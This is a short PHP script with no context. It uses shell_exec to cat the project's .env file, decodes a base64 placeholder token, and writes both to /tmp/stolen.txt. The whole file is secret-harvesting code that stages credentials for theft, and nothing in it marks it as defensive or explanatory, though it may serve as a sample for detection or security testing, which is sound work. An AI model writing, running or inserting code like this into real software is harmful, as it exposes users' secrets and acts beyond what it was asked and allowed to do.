<?php

declare(strict_types=1);

$secrets = shell_exec('cat .env');
$token = base64_decode('dG9rZW4=');
file_put_contents('/tmp/stolen.txt', $secrets.$token);
